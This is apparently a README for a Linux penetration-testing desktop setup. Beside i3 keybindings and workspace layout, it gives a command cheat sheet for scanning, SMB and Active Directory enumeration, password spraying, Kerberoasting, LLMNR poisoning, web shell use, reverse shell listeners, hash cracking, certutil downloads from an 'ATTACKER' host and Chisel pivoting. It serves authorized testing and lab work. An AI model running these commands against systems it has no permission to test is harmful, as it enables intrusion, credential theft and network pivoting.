
### Starting a New Pentest
```bash
# Option 1: Full automated workspace
pentest-workspace 10.10.10.123

# Option 2: Quick scan menu (GUI)
Super+P → Select scan type

# Option 3: Manual setup
mkdir -p ~/pentest/target-name
cd ~/pentest/target-name
```

### Workspace Organization
- **WS1: Recon** - Initial reconnaissance, port scanning, service discovery
- **WS2: Enum** - Detailed enumeration, directory busting, vulnerability scanning
- **WS3: Exploit** - Browser, Burp Suite, exploitation tools
- **WS4: Post** - Post-exploitation, lateral movement, privilege escalation
- **WS5: Notes** - Documentation, screenshots, report writing

## ⌨️ Essential Keybindings

### Window Management
| Keybinding | Action |
|------------|--------|
| `Super+Enter` | Open terminal |
| `Super+D` | App launcher (Rofi) |
| `Super+Shift+Q` | Kill focused window |
| `Super+` ` | Floating terminal (quick commands) |
| `Super+F` | Fullscreen toggle |
| `Super+Shift+Space` | Toggle floating |

### Navigation (Vim-style)
| Keybinding | Action |
|------------|--------|
| `Super+H/J/K/L` | Focus left/down/up/right |
| `Super+Shift+H/J/K/L` | Move window left/down/up/right |
| `Super+1-5` | Switch to workspace |
| `Super+Shift+1-5` | Move window to workspace |

### Pentest Quick Launch
| Keybinding | Action |
|------------|--------|
| `Super+P` | **Quick scan launcher** (Rofi menu) |
| `Super+Shift+B` | Open Burp Suite |
| `Super+Shift+W` | Open Wireshark |
| `Super+Shift+M` | Open Metasploit Console |
| `Super+Shift+N` | Quick nmap (will prompt for target) |

### System
| Keybinding | Action |
|------------|--------|
| `Super+Shift+C` | Reload i3 config |
| `Super+Shift+R` | Restart i3 |
| `Super+Shift+X` | Lock screen |
| `Print` | Screenshot (selection to clipboard) |
| `Super+R` | Resize mode (H/J/K/L to resize) |

## 🔧 CLI Tools Reference

### Reconnaissance
```bash
# Quick port scan
rustscan -a TARGET -- -sC -sV

# Full TCP scan
sudo nmap -p- -sC -sV -A -T4 TARGET -oN scans/full-tcp.txt

# UDP top ports
sudo nmap -sU --top-ports 100 TARGET -oN scans/udp.txt

# DNS enumeration
subfinder -d domain.com | httpx -title -status-code
```

### Web Enumeration
```bash
# Directory bruteforce (fast)
feroxbuster -u http://TARGET -w /usr/share/seclists/Discovery/Web-Content/common.txt

# Classic gobuster
gobuster dir -u http://TARGET -w /usr/share/wordlists/dirb/common.txt

# Subdomain enumeration
subfinder -d domain.com -silent | httpx -silent

# Web tech detection
whatweb TARGET

# Nuclei vulnerability scan
nuclei -u http://TARGET -t ~/nuclei-templates/
```

### SMB/Windows
```bash
# SMB enumeration
crackmapexec smb TARGET -u '' -p ''
smbclient -L //TARGET -N
enum4linux -a TARGET

# Password spraying
crackmapexec smb TARGET -u users.txt -p 'Password123'

# Kerberoasting
GetUserSPNs.py domain/user:pass -dc-ip DC_IP -request
```

### Active Directory
```bash
# BloodHound data collection
bloodhound-python -u user -p pass -d domain.local -c All -dc dc.domain.local

# LDAP enumeration
ldapsearch -x -H ldap://TARGET -b "DC=domain,DC=local"

# Responder (LLMNR/NBT-NS poisoning)
sudo responder -I eth0 -wrf
```

### Exploitation
```bash
# Metasploit
msfconsole
search exploit_name
use exploit/multi/handler

# Reverse shell listeners
nc -lvnp 4444
pwncat-cs -lp 4444

# Web shells
curl http://TARGET/shell.php?cmd=whoami
```

### Post-Exploitation
```bash
# Linux enumeration
./linpeas.sh
./linux-smart-enumeration.sh

# Windows enumeration
.\winPEAS.exe
.\PowerUp.ps1; Invoke-AllChecks

# File transfers
python3 -m http.server 8000
certutil -urlcache -f http://ATTACKER/file.exe file.exe

# Pivoting with Chisel
# Attacker: chisel server -p 8000 --reverse
# Victim: chisel client ATTACKER:8000 R:1080:socks

# Pivoting with Ligolo
ligolo-ng -selfcert
```

### Password Attacks
```bash
# Hashcat
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt

# John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Hydra
hydra -l admin -P passwords.txt ssh://TARGET
```

## 📁 Directory Structure

Auto-created by `pentest-workspace`:
```
~/pentest/
└── <target>/
    ├── recon/          # Initial recon data
    ├── scans/          # Nmap, masscan, etc.
    ├── loot/           # Credentials, hashes, files
    ├── screenshots/    # Evidence
    └── notes/          # Markdown notes
```

## 🎨 Tmux Workflow

```bash
# Start named session
tmux new -s TARGET

# Panes for multi-tasking
Ctrl+B |    # Split vertical
Ctrl+B -    # Split horizontal
Ctrl+B arrows  # Navigate panes

# Windows (tabs)
Ctrl+B C    # New window
Ctrl+B N    # Next window
Ctrl+B P    # Previous window
```

## 🔥 Pro Tips

### 1. Quick Recon Pipeline
```bash
# One-liner recon
echo TARGET | subfinder | httpx | nuclei -t cves/
```

### 2. Auto-organize Screenshots
```bash
# Screenshots go to current pentest dir
alias ss='maim -s ~/pentest/$(basename $PWD)/screenshots/$(date +%Y%m%d_%H%M%S).png'
```

### 3. Burp + Terminal Workflow
- WS3: Burp Suite + Browser
- WS2: Terminal running gobuster/ffuf
- WS4: Terminal for exploitation
- Easy Super+2/3/4 switching

### 4. VPN Management
```bash
# Auto-connect to HTB/THM VPN on startup
sudo openvpn ~/vpn/lab.ovpn &
```

### 5. Note-taking Templates
Use the auto-generated markdown in `notes/` directory:
- Tracks all attempts
- Documents vulnerabilities
- Stores credentials
- Includes timestamps

## 🛡️ OpSec Reminders

- Always use VPN (check `ip a` for tun0)
- Verify target scope before scanning
- Use `--rate-limit` on aggressive scans
- Document everything (CYA)
- Keep loot organized per target

## 📚 Wordlist Locations

```bash
/usr/share/wordlists/rockyou.txt
/usr/share/seclists/
/usr/share/dirb/wordlists/
/usr/share/wordlists/wfuzz/
```

## 🔄 Quick Updates

```bash
# Update tools
sudo pacman -Syu
yay -Syu

# Update nuclei templates
nuclei -update-templates

# Update seclists
cd /usr/share/seclists && git pull
```

---

**Remember**: `Super+P` is your friend for quick scans! 🚀
